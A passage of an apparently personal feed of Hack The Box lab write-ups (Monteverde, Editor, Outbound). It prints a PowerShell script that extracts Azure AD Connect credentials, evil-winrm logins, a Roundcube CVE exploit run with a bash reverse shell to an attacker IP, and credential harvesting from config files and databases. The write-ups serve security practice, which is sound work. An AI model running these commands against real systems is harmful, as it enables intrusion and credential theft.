+<span class="hljs-variable">VersionInfo</span>       <span class="hljs-operator">:</span> <span class="hljs-built_in">File</span><span class="hljs-operator">:</span>             <span class="hljs-built_in">C</span><span class="hljs-operator">:</span>\<span class="hljs-variable">Program</span> <span class="hljs-variable">Files</span>\<span class="hljs-variable">Microsoft</span> <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> <span class="hljs-variable">Sync</span>\<span class="hljs-variable">Bin</span>\<span class="hljs-variable">miiserver</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span>
+                    <span class="hljs-variable">InternalName</span><span class="hljs-operator">:</span>     <span class="hljs-variable">miiserver</span>
+                    <span class="hljs-variable">OriginalFilename</span><span class="hljs-operator">:</span> <span class="hljs-variable">miiserver</span><span class="hljs-operator">.</span><span class="hljs-variable">exe</span>
+                    <span class="hljs-variable">FileVersion</span><span class="hljs-operator">:</span>      <span class="hljs-number">1.1</span><span class="hljs-number">.882</span><span class="hljs-number">.0</span>
+                    <span class="hljs-variable">FileDescription</span><span class="hljs-operator">:</span>  <span class="hljs-variable">AD</span><span class="hljs-operator">-</span><span class="hljs-variable">IAM</span><span class="hljs-operator">-</span><span class="hljs-variable">HybridSync</span> <span class="hljs-variable">master</span> <span class="hljs-punctuation">(</span><span class="hljs-number">0</span><span class="hljs-variable">eb4240d4</span><span class="hljs-punctuation">)</span> <span class="hljs-variable">Azure</span> <span class="hljs-variable">AD</span> <span class="hljs-built_in">Connect</span> <span class="hljs-variable">synchronization</span> <span class="hljs-variable">service</span><span class="hljs-operator">.</span>
+                    <span class="hljs-built_in">Product</span><span class="hljs-operator">:</span>          <span class="hljs-variable">Microsoft</span>Â® <span class="hljs-variable">Azure</span>Â® <span class="hljs-variable">AD</span> <span class="hljs-built_in">Connect</span>
+                    <span class="hljs-variable">ProductVersion</span><span class="hljs-operator">:</span>   <span class="hljs-number">1.1</span><span class="hljs-number">.882</span><span class="hljs-number">.0</span></code></pre></div>
+<p>sqlcmd -S MONTEVERDE -Q “use ADsync; select instance_id,keyset_id,entropy from mms_server_configuration”</p>
+<div><pre class="hljs"><code><span class="hljs-function"><span class="hljs-keyword">Function</span> <span class="hljs-title">Get-ADConnectPassword</span></span>{
+<span class="hljs-built_in">Write-Host</span> <span class="hljs-string">"AD Connect Sync Credential Extract POC (@_xpn_)`n"</span>
+<span class="hljs-variable">$key_id</span> = <span class="hljs-number">1</span>
+<span class="hljs-variable">$instance_id</span> = [<span class="hljs-type">GUID</span>]<span class="hljs-string">"1852B527-DD4F-4ECF-B541-EFCCBFF29E31"</span>
+<span class="hljs-variable">$entropy</span> = [<span class="hljs-type">GUID</span>]<span class="hljs-string">"194EC2FC-F186-46CF-B44D-071EB61F49CD"</span>
+<span class="hljs-variable">$client</span> = <span class="hljs-built_in">new-object</span> System.Data.SqlClient.SqlConnection <span class="hljs-literal">-ArgumentList</span>
+<span class="hljs-string">"Server=MONTEVERDE;Database=ADSync;Trusted_Connection=true"</span>
+<span class="hljs-variable">$client</span>.Open()
+<span class="hljs-variable">$cmd</span> = <span class="hljs-variable">$client</span>.CreateCommand()
+<span class="hljs-variable">$cmd</span>.CommandText = <span class="hljs-string">"SELECT private_configuration_xml, encrypted_configuration FROM mms_management_agent WHERE ma_type = 'AD'"</span>
+<span class="hljs-variable">$reader</span> = <span class="hljs-variable">$cmd</span>.ExecuteReader()
+<span class="hljs-variable">$reader</span>.Read() | <span class="hljs-built_in">Out-Null</span>
+<span class="hljs-variable">$config</span> = <span class="hljs-variable">$reader</span>.GetString(<span class="hljs-number">0</span>)
+<span class="hljs-variable">$crypted</span> = <span class="hljs-variable">$reader</span>.GetString(<span class="hljs-number">1</span>)
+<span class="hljs-variable">$reader</span>.Close()
+<span class="hljs-built_in">add-type</span> <span class="hljs-literal">-path</span> <span class="hljs-string">'C:\Program Files\Microsoft Azure AD Sync\Bin\mcrypt.dll'</span>
+<span class="hljs-variable">$km</span> = <span class="hljs-built_in">New-Object</span> <span class="hljs-literal">-TypeName</span>
+Microsoft.DirectoryServices.MetadirectoryServices.Cryptography.KeyManager
+<span class="hljs-variable">$km</span>.LoadKeySet(<span class="hljs-variable">$entropy</span>, <span class="hljs-variable">$instance_id</span>, <span class="hljs-variable">$key_id</span>)
+<span class="hljs-variable">$key</span> = <span class="hljs-variable">$null</span>
+<span class="hljs-variable">$km</span>.GetActiveCredentialKey([<span class="hljs-type">ref</span>]<span class="hljs-variable">$key</span>)
+<span class="hljs-variable">$key2</span> = <span class="hljs-variable">$null</span>
+<span class="hljs-variable">$km</span>.GetKey(<span class="hljs-number">1</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$key2</span>)
+<span class="hljs-variable">$decrypted</span> = <span class="hljs-variable">$null</span>
+<span class="hljs-variable">$key2</span>.DecryptBase64ToString(<span class="hljs-variable">$crypted</span>, [<span class="hljs-type">ref</span>]<span class="hljs-variable">$decrypted</span>)
+<span class="hljs-variable">$domain</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$config</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">"//parameter[@name='forest-login-domain']"</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>{Name = <span class="hljs-string">'Domain'</span>; Expression = {<span class="hljs-variable">$_</span>.node.InnerXML}}
+<span class="hljs-variable">$username</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$config</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">"//parameter[@name='forest-login-user']"</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>{Name = <span class="hljs-string">'Username'</span>; Expression = {<span class="hljs-variable">$_</span>.node.InnerXML}}
+<span class="hljs-variable">$password</span> = <span class="hljs-built_in">select-xml</span> <span class="hljs-literal">-Content</span> <span class="hljs-variable">$decrypted</span> <span class="hljs-literal">-XPath</span> <span class="hljs-string">"//attribute"</span> | <span class="hljs-built_in">select</span> <span class="hljs-selector-tag">@</span>{Name =
+<span class="hljs-string">'Password'</span>; Expression = {<span class="hljs-variable">$_</span>.node.InnerXML}}
+<span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">"Domain: "</span> + <span class="hljs-variable">$domain</span>.Domain)
+<span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">"Username: "</span> + <span class="hljs-variable">$username</span>.Username)
+<span class="hljs-built_in">Write-Host</span> (<span class="hljs-string">"Password: "</span> + <span class="hljs-variable">$password</span>.Password)
+}</code></pre></div>
+<p>evil-winrm -i 10.10.10.172 -u mhope -p “4n0therD4y@n0th3r$” -s . adconnect.ps1<br />
+adconnect.ps1<br />
+Get-ADConnectPassword</p>
+<p>evil-winrm -i 10.10.10.172 -u administrator -p ‘d0m@in4dminyeah!’</p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Linux - Easy - Editor]]></title>
+            <guid>5bed582afb9a461f8fa2dea0eacd23d4</guid>
+            <pubDate>Wed, 06 Aug 2025 08:52:15 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<p><img src="/_resources/33052e1c382b43e6ad6cf609aa35712a.png" /></p>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$nmap</span> -p- -A editor.htb
+PORT     STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp   open  ssh     OpenSSH <span class="hljs-number">8.9</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu0.<span class="hljs-number">13</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-hostkey: 
+|   <span class="hljs-number">256</span> <span class="hljs-number">3</span>e:ea:<span class="hljs-number">45</span>:<span class="hljs-number">4</span>b:c5:d1:<span class="hljs-number">6</span>d:<span class="hljs-number">6</span>f:e2:d4:d1:<span class="hljs-number">3</span>b:<span class="hljs-number">0</span>a:<span class="hljs-number">3</span>d:a9:<span class="hljs-number">4</span>f (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-number">64</span>:cc:<span class="hljs-number">75</span>:de:<span class="hljs-number">4</span>a:e6:a5:b4:<span class="hljs-number">73</span>:eb:<span class="hljs-number">3</span>f:<span class="hljs-number">1</span>b:cf:b4:e3:<span class="hljs-number">94</span> (ED25519)
+<span class="hljs-number">80</span>/tcp   open  http    nginx <span class="hljs-number">1.18</span>.<span class="hljs-number">0</span> (Ubuntu)
+|_http-server-header: nginx/<span class="hljs-number">1.18</span>.<span class="hljs-number">0</span> (Ubuntu)
+|_http-title: Editor - SimplistCode Pro
+<span class="hljs-number">8080</span>/tcp open  http    Jetty <span class="hljs-number">10.0</span>.<span class="hljs-number">20</span>
+| http-title: XWiki - Main - Intro
+|_Requested resource was http:<span class="hljs-regexp">//</span>editor.htb:<span class="hljs-number">8080</span><span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/view/</span>Main/
+|_http-open-proxy: Proxy might be redirecting requests
+| http-cookie-flags: 
+|   /: 
+|     JSESSIONID: 
+|_      httponly flag not set
+| http-methods: 
+|_  Potentially risky methods: PROPFIND LOCK UNLOCK
+|_http-server-header: Jetty(<span class="hljs-number">10.0</span>.<span class="hljs-number">20</span>)
+| http-robots.txt: <span class="hljs-number">50</span> disallowed entries (<span class="hljs-number">15</span> shown)
+| <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/viewattachrev/</span> <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/viewrev/</span> 
+| <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/pdf/</span> <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/edit/</span> <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/create/</span> 
+| <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/inline/</span> <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/preview/</span> <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/save/</span> 
+| <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/saveandcontinue/</span> <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/rollback/</span> <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/deleteversions/</span> 
+| <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/cancel/</span> <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/delete/</span> <span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/deletespace/</span> 
+|_<span class="hljs-regexp">/xwiki/</span>bin<span class="hljs-regexp">/undelete/</span>
+| http-webdav-scan: 
+|   Allowed Methods: OPTIONS, GET, HEAD, PROPFIND, LOCK, UNLOCK
+|   Server Type: Jetty(<span class="hljs-number">10.0</span>.<span class="hljs-number">20</span>)
+|_  WebDAV type: Unknown
+Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel</code></pre></div>
+<p><img src="/_resources/3659d847b16c4ccb86f9746264be1d63.png" /></p>
+<p>Clicking docs on the main page leads us to XWiki Debian 15.10.8, which is vulnerable.</p>
+<p><img src="/_resources/5148d9e2b0894befab6e5cc5a2e22d8c.png" /></p>
+<p><a title="https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC" href="https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC">https://github.com/dollarboysushil/CVE-2025-24893-XWiki-Unauthenticated-RCE-Exploit-POC</a></p>
+<p><img src="/_resources/1a8fd8d35d3c4b02a573c0ffe9640092.png" /></p>
+<p>Shell stabilisationfor Qol.</p>
+<div><pre class="hljs"><code>python3 -c <span class="hljs-string">'import pty;pty.spawn("bash")'</span>
+stty raw -<span class="hljs-built_in">echo</span> 
+^Z
+<span class="hljs-built_in">fg</span></code></pre></div>
+<p><img src="/_resources/9900f8738d23443c8309cd8cbbd0afbd.png" /></p>
+<p>After doing enumeration we can find user password.</p>
+<div><pre class="hljs"><code><span class="hljs-keyword">find</span> <span class="hljs-regexp">/etc/</span>xwiki -type f -name <span class="hljs-string">"*.xml"</span> -exec <span class="hljs-keyword">grep</span> -iE <span class="hljs-string">".*pass.*"</span> {} + <span class="hljs-number">2</span>&gt;<span class="hljs-regexp">/dev/</span><span class="hljs-keyword">null</span></code></pre></div>
+<p>pass: theEd1t0rTeam99</p>
+<p>IMPORATANT: <code>su oliver</code> wont work, we have to ssh into it.</p>
+<h1 id="priv-esc">Priv esc</h1>
+<p>We can check that on port 19999 is netdata with version 1.45.2.<br />
+We can quickly find CVE with POC for it.</p>
+<p><a title="https://securityvulnerability.io/vulnerability/CVE-2024-32019" href="https://securityvulnerability.io/vulnerability/CVE-2024-32019">https://securityvulnerability.io/vulnerability/CVE-2024-32019</a><br />
+<a title="https://github.com/AzureADTrent/CVE-2024-32019-POC" href="https://github.com/AzureADTrent/CVE-2024-32019-POC">https://github.com/AzureADTrent/CVE-2024-32019-POC</a></p>
+<p>Following the step by step guide we get root.</p>
+<p><img src="/_resources/8893ec77c7484c0d864aa9fa6af02bd5.png" /></p>
+]]></content:encoded>
+        </item>
+        <item>
+            <title><![CDATA[Linux - Easy - Outbound]]></title>
+            <guid>aa2ea145ea6c4a2886a8b8691fe992a1</guid>
+            <pubDate>Fri, 01 Aug 2025 14:58:59 GMT</pubDate>
+            <content:encoded><![CDATA[<h1 id="recon">Recon</h1>
+<div><pre class="hljs"><code>└──╼ <span class="hljs-variable">$nmap</span> -p- -A <span class="hljs-number">10.129</span>.<span class="hljs-number">167.65</span>
+Starting Nmap <span class="hljs-number">7.94</span>SVN ( <span class="hljs-symbol">https:</span>//nmap.org ) at <span class="hljs-number">2025</span><span class="hljs-number">-08</span><span class="hljs-number">-01</span> <span class="hljs-number">14</span><span class="hljs-symbol">:</span><span class="hljs-number">58</span> UTC
+Nmap scan report <span class="hljs-keyword">for</span> <span class="hljs-number">10.129</span>.<span class="hljs-number">167.65</span>
+Host is up (<span class="hljs-number">0.051</span>s latency).
+Not <span class="hljs-symbol">shown:</span> <span class="hljs-number">65533</span> closed tcp ports (conn-refused)
+PORT   STATE SERVICE VERSION
+<span class="hljs-number">22</span>/tcp open  ssh     OpenSSH <span class="hljs-number">9.6</span>p1 Ubuntu <span class="hljs-number">3</span>ubuntu13.<span class="hljs-number">12</span> (Ubuntu Linux; protocol <span class="hljs-number">2.0</span>)
+| ssh-<span class="hljs-symbol">hostkey:</span> 
+|   <span class="hljs-number">256</span> <span class="hljs-number">0</span><span class="hljs-symbol">c:</span><span class="hljs-number">4</span><span class="hljs-symbol">b:</span><span class="hljs-symbol">d2:</span><span class="hljs-number">76</span><span class="hljs-symbol">:ab</span><span class="hljs-symbol">:</span><span class="hljs-number">10</span><span class="hljs-symbol">:</span><span class="hljs-number">06</span><span class="hljs-symbol">:</span><span class="hljs-number">92</span><span class="hljs-symbol">:</span><span class="hljs-number">05</span><span class="hljs-symbol">:dc</span><span class="hljs-symbol">:f7</span><span class="hljs-symbol">:</span><span class="hljs-number">55</span><span class="hljs-symbol">:</span><span class="hljs-number">94</span><span class="hljs-symbol">:</span><span class="hljs-number">7</span><span class="hljs-symbol">f:</span><span class="hljs-number">18</span><span class="hljs-symbol">:df</span> (ECDSA)
+|_  <span class="hljs-number">256</span> <span class="hljs-number">2</span><span class="hljs-symbol">d:</span><span class="hljs-number">6</span><span class="hljs-symbol">d:</span><span class="hljs-number">4</span><span class="hljs-symbol">a:</span><span class="hljs-number">4</span><span class="hljs-symbol">c:</span><span class="hljs-symbol">ee:</span><span class="hljs-number">2</span><span class="hljs-symbol">e:</span><span class="hljs-number">11</span><span class="hljs-symbol">:b6</span><span class="hljs-symbol">:c8</span><span class="hljs-symbol">:</span><span class="hljs-number">90</span><span class="hljs-symbol">:e6</span><span class="hljs-symbol">:</span><span class="hljs-number">83</span><span class="hljs-symbol">:e9</span><span class="hljs-symbol">:df</span><span class="hljs-symbol">:</span><span class="hljs-number">38</span><span class="hljs-symbol">:b0</span> (ED25519)
+<span class="hljs-number">80</span>/tcp open  http    nginx <span class="hljs-number">1.24</span>.<span class="hljs-number">0</span> (Ubuntu)
+|_http-<span class="hljs-symbol">title:</span> Did <span class="hljs-keyword">not</span> follow redirect to <span class="hljs-symbol">http:</span>//mail.outbound.htb/
+|_http-server-<span class="hljs-symbol">header:</span> nginx/<span class="hljs-number">1.24</span>.<span class="hljs-number">0</span> (Ubuntu)
+Service <span class="hljs-symbol">Info:</span> <span class="hljs-symbol">OS:</span> Linux; <span class="hljs-symbol">CPE:</span> <span class="hljs-symbol">cpe:</span>/<span class="hljs-symbol">o:</span><span class="hljs-symbol">linux:</span>linux_kernel</code></pre></div>
+<p>We get a mail service with provided credentials, roundcube webmail.</p>
+<p><img src="/_resources/f519b555f5f24cbbb82cf6c276ecfdcc.png" /></p>
+<p><img src="/_resources/70d1d109dc6f47178ec3265013a667a3.png" /></p>
+<h1 id="foothold">Foothold</h1>
+<p>Quick look online gets us a CVE.</p>
+<p>(<a title="https://www.exploit-db.com/exploits/52324" href="https://www.exploit-db.com/exploits/52324">https://www.exploit-db.com/exploits/52324</a>)[<a title="https://www.exploit-db.com/exploits/52324" href="https://www.exploit-db.com/exploits/52324">https://www.exploit-db.com/exploits/52324</a>]</p>
+<div><pre class="hljs"><code>┌─[✗]─[user@parrot]─[~<span class="hljs-regexp">/Desktop/</span>htb<span class="hljs-regexp">/boxes/</span>Outbound]
+└──╼ <span class="hljs-variable">$php</span> CVE-<span class="hljs-number">2025</span>-<span class="hljs-number">49113</span>.php http:<span class="hljs-regexp">//m</span>ail.outbound.htb tyler LhKL1o9Nm3X2 <span class="hljs-string">"bash -c 'bash -i &gt;&amp; /dev/tcp/10.10.16.18/4444 0&gt;&amp;1'"</span>
+
+┌─[✗]─[user@parrot]─[~<span class="hljs-regexp">/Desktop/</span>htb<span class="hljs-regexp">/boxes/</span>Outbound]
+└──╼ <span class="hljs-variable">$nc</span> -lvnp <span class="hljs-number">4444</span>
+listening on [any] <span class="hljs-number">4444</span> ...
+connect to [<span class="hljs-number">10.10</span>.<span class="hljs-number">16.18</span>] from (UNKNOWN) [<span class="hljs-number">10.129</span>.<span class="hljs-number">232.158</span>] <span class="hljs-number">48370</span>
+bash: cannot set terminal process group (<span class="hljs-number">247</span>): Inappropriate ioctl <span class="hljs-keyword">for</span> device
+bash: no job control <span class="hljs-keyword">in</span> this shell
+www-data@mail:/$ </code></pre></div>
+<p>First, we can change into tyler.<br />
+Looking for config files we get <code>config.inc.php</code> with <code>mysql://roundcube:RCDBPass2025@localhost/roundcubesls</code> in it.</p>
+<div><pre class="hljs"><code>www-data<span class="hljs-variable">@mail</span><span class="hljs-symbol">:/var/www/html/roundcube/config</span><span class="hljs-variable">$ </span>ls
+ls
+config.inc.php
+config.inc.php.sample
+defaults.inc.php
+mimetypes.php</code></pre></div>
+<p>We can then checkout the database and get sessions.<br />
+<code>mysql -u roundcube -pRCDBPass2025 roundcube -e "use roundcube; select * from session;"</code></p>
+<p>We also get a key <code>$config['des_key'] = 'rcmail-!24ByteDESkey*Str'; </code></p>
+<p>Then, we can put them into cyberchef and get some data about jacob.</p>
+<p><img src="/_resources/e556792d5e5d4c249abe3ea6c346b935.png" /></p>
+<div><pre class="hljs"><code><span class="hljs-attribute">language</span>|s:<span class="hljs-number">5</span>:<span class="hljs-string">"en_US"</span>;imap_namespace|a:<span class="hljs-number">4</span>:{s:<span class="hljs-number">8</span>:<span class="hljs-string">"personal"</span>;a:<span class="hljs-number">1</span>:{i:<span class="hljs-number">0</span>;a:<span class="hljs-number">2</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">""</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">1</span>:<span class="hljs-string">"/"</span>;}}s:<span class="hljs-number">5</span>:<span class="hljs-string">"other"</span>;N;s:<span class="hljs-number">6</span>:<span class="hljs-string">"shared"</span>;N;s:<span class="hljs-number">10</span>:<span class="hljs-string">"prefix_out"</span>;s:<span class="hljs-number">0</span>:<span class="hljs-string">""</span>;}imap_delimiter|s:<span class="hljs-number">1</span>:<span class="hljs-string">"/"</span>;imap_list_conf|a:<span class="hljs-number">2</span>:{i:<span class="hljs-number">0</span>;N;i:<span class="hljs-number">1</span>;a:<span class="hljs-number">0</span>:{}}user_id|i:<span class="hljs-number">1</span>;username|s:<span class="hljs-number">5</span>:<span class="hljs-string">"jacob"</span>;storage_host|s:<span class="hljs-number">9</span>:<span class="hljs-string">"localhost"</span>;storage_port|i:<span class="hljs-number">143</span>;storage_ssl|b:<span class="hljs-number">0</span>;password|s:<span class="hljs-number">32</span>:<span class="hljs-string">"L7Rv00A8TuwJAr67kITxxcSgnIk25Am/"</span>;login_time|i:<span class="hljs-number">1749397119</span>;timezone|s:<span class="hljs-number">13</span>:<span class="hljs-string">"Europe/London"</span>;STORAGE_SPECIAL-USE|b:<span class="hljs-number">1</span>;auth_secret|s:<span class="hljs-number">26</span>:<span class="hljs-string">"DpYqv6maI9HxDL5GhcCd8JaQQW"</span>;request_token|s:<span class="hljs-number">32</span>:<span class="hljs-string">"TIsOaABA1zHSXZOBpH6up5XFyayNRHaw"</span>;task|s:<span class="hljs-number">4</span>:<span class="hljs-string">"mail"</span>;skin_config|a:<span class="hljs-number">7</span>:{s:<span class="hljs-number">17</span>:<span class="hljs-string">"supported_layouts"</span>;a:<span class="hljs-number">1</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">"widescreen"</span>;}s:<span class="hljs-number">22</span>:<span class="hljs-string">"jquery_ui_colors_theme"</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">"bootstrap"</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">"embed_css_location"</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">"/styles/embed.css"</span>;s:<span class="hljs-number">19</span>:<span class="hljs-string">"editor_css_location"</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">"/styles/embed.css"</span>;s:<span class="hljs-number">17</span>:<span class="hljs-string">"dark_mode_support"</span>;b:<span class="hljs-number">1</span>;s:<span class="hljs-number">26</span>:<span class="hljs-string">"media_browser_css_location"</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"none"</span>;s:<span class="hljs-number">21</span>:<span class="hljs-string">"additional_logo_types"</span>;a:<span class="hljs-number">3</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"dark"</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"small"</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">"small-dark"</span>;}}imap_host|s:<span class="hljs-number">9</span>:<span class="hljs-string">"localhost"</span>;page|i:<span class="hljs-number">1</span>;mbox|s:<span class="hljs-number">5</span>:<span class="hljs-string">"INBOX"</span>;sort_col|s:<span class="hljs-number">0</span>:<span class="hljs-string">""</span>;sort_order|s:<span class="hljs-number">4</span>:<span class="hljs-string">"DESC"</span>;STORAGE_THREAD|a:<span class="hljs-number">3</span>:{i:<span class="hljs-number">0</span>;s:<span class="hljs-number">10</span>:<span class="hljs-string">"REFERENCES"</span>;i:<span class="hljs-number">1</span>;s:<span class="hljs-number">4</span>:<span class="hljs-string">"REFS"</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">"ORDEREDSUBJECT"</span>;}STORAGE_QUOTA|b:<span class="hljs-number">0</span>;STORAGE_LIST-EXTENDED|b:<span class="hljs-number">1</span>;list_attrib|a:<span class="hljs-number">6</span>:{s:<span class="hljs-number">4</span>:<span class="hljs-string">"name"</span>;s:<span class="hljs-number">8</span>:<span class="hljs-string">"messages"</span>;s:<span class="hljs-number">2</span>:<span class="hljs-string">"id"</span>;s:<span class="hljs-number">11</span>:<span class="hljs-string">"messagelist"</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"class"</span>;s:<span class="hljs-number">42</span>:<span class="hljs-string">"listing messagelist sortheader fixedheader"</span>;s:<span class="hljs-number">15</span>:<span class="hljs-string">"aria-labelledby"</span>;s:<span class="hljs-number">22</span>:<span class="hljs-string">"aria-label-messagelist"</span>;s:<span class="hljs-number">9</span>:<span class="hljs-string">"data-list"</span>;s:<span class="hljs-number">12</span>:<span class="hljs-string">"message_list"</span>;s:<span class="hljs-number">14</span>:<span class="hljs-string">"data-label-msg"</span>;s:<span class="hljs-number">18</span>:<span class="hljs-string">"The list is empty."</span>;}unseen_count|a:<span class="hljs-number">2</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"INBOX"</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">5</span>:<span class="hljs-string">"Trash"</span>;i:<span class="hljs-number">0</span>;}folders|a:<span class="hljs-number">1</span>:{s:<span class="hljs-number">5</span>:<span class="hljs-string">"INBOX"</span>;a:<span class="hljs-number">2</span>:{s:<span class="hljs-number">3</span>:<span class="hljs-string">"cnt"</span>;i:<span class="hljs-number">2</span>;s:<span class="hljs-number">6</span>:<span class="hljs-string">"maxuid"</span>;i:<span class="hljs-number">3</span>;}}list_mod_seq|s:<span class="hljs-number">2</span>:<span class="hljs-string">"10"</span>;```</code></pre></div>
+<p>so the pass is: <code>L7Rv00A8TuwJAr67kITxxcSgnIk25Am/</code></p>
+<p><img src="/_resources/2df7ada4ca584005a7edb9f44ad99bfc.png" /></p>
+<p><img src="/_resources/0192a1893d384291a7baf53ea5ad0621.png" /></p>
+<p>so the pass is: <code>595mO8DmwGeD</code></p>
+<p>We then can su into tyler and get creds from his home folder.</p>
+<div><pre class="hljs"><code><span class="hljs-string">su</span> <span class="hljs-string">jacob</span>
+<span class="hljs-attr">Password:</span> <span class="hljs-string">595mO8DmwGeD</span>
+
+<span class="hljs-string">cd</span> <span class="hljs-string">~</span>
+<span class="hljs-string">pwd</span>
+<span class="hljs-string">/home/jacob</span>
+<span class="hljs-string">ls</span>
+<span class="hljs-string">mail</span>
+<span class="hljs-string">cd</span> <span class="hljs-string">mial</span>
+<span class="hljs-attr">bash: line 5: cd: mial:</span> <span class="hljs-literal">No</span> <span class="hljs-string">such</span> <span class="hljs-string">file</span> <span class="hljs-string">or</span> <span class="hljs-string">directory</span>
+<span class="hljs-string">cd</span> <span class="hljs-string">mail</span>
+<span class="hljs-string">ls</span>
+<span class="hljs-string">INBOX</span>
+<span class="hljs-string">Trash</span>
+<span class="hljs-string">cd</span> <span class="hljs-string">INBOX</span>
+<span class="hljs-string">ls</span>
+<span class="hljs-string">jacob</span>
+<span class="hljs-string">cat</span> <span class="hljs-string">jacob</span>
+<span class="hljs-string">From</span> <span class="hljs-string">tyler@outbound.htb</span>  <span class="hljs-string">Sat</span> <span class="hljs-string">Jun</span> <span class="hljs-number">07</span> <span class="hljs-number">14</span><span class="hljs-string">:00:58</span> <span class="hljs-number">2025</span>
+<span class="hljs-attr">Return-Path:</span> <span class="hljs-string">&lt;tyler@outbound.htb&gt;</span>
+<span class="hljs-attr">X-Original-To:</span> <span class="hljs-string">jacob</span>
+<span class="hljs-attr">Delivered-To:</span> <span class="hljs-string">jacob@outbound.htb</span>
+<span class="hljs-attr">Received:</span> <span class="hljs-string">by</span> <span class="hljs-string">outbound.htb</span> <span class="hljs-string">(Postfix,</span> <span class="hljs-string">from</span> <span class="hljs-string">userid</span> <span class="hljs-number">1000</span><span class="hljs-string">)</span>
+    <span class="hljs-string">id</span> <span class="hljs-string">B32C410248D;</span> <span class="hljs-string">Sat,</span>  <span class="hljs-number">7</span> <span class="hljs-string">Jun</span> <span class="hljs-number">2025 14:00:58</span> <span class="hljs-string">+0000</span> <span class="hljs-string">(UTC)</span>
+<span class="hljs-attr">To:</span> <span class="hljs-string">jacob@outbound.htb</span>
+<span class="hljs-attr">Subject:</span> <span class="hljs-string">Important</span> <span class="hljs-string">Update</span>
+<span class="hljs-attr">MIME-Version:</span> <span class="hljs-number">1.0</span>
+<span class="hljs-attr">Content-Type:</span> <span class="hljs-string">text/plain;</span> <span class="hljs-string">charset="UTF-8"</span>
+<span class="hljs-attr">Content-Transfer-Encoding:</span> <span class="hljs-string">8bit</span>
+<span class="hljs-attr">Message-Id:</span> <span class="hljs-string">&lt;20250607140058.B32C410248D@outbound.htb&gt;</span>
+<span class="hljs-attr">Date:</span> <span class="hljs-string">Sat,</span>  <span class="hljs-number">7</span> <span class="hljs-string">Jun</span> <span class="hljs-number">2025 14:00:58</span> <span class="hljs-string">+0000</span> <span class="hljs-string">(UTC)</span>
+<span class="hljs-attr">From:</span> <span class="hljs-string">tyler@outbound.htb</span>
+<span class="hljs-attr">X-IMAPbase:</span> <span class="hljs-number">1749304753</span> <span class="hljs-number">0000000002</span>
+<span class="hljs-attr">X-UID:</span> <span class="hljs-number">1</span>
+<span class="hljs-attr">Status:</span> 
+<span class="hljs-attr">X-Keywords:</span>                                                                       
+<span class="hljs-attr">Content-Length:</span> <span class="hljs-number">233</span>
+
+<span class="hljs-string">Due</span> <span class="hljs-string">to</span> <span class="hljs-string">the</span> <span class="hljs-string">recent</span> <span class="hljs-string">change</span> <span class="hljs-string">of</span> <span class="hljs-string">policies</span> <span class="hljs-string">your</span> <span class="hljs-string">password</span> <span class="hljs-string">has</span> <span class="hljs-string">been</span> <span class="hljs-string">changed.</span>
+
+<span class="hljs-attr">Please use the following credentials to log into your account:</span> <span class="hljs-string">gY4Wr3a1evp4</span>
+
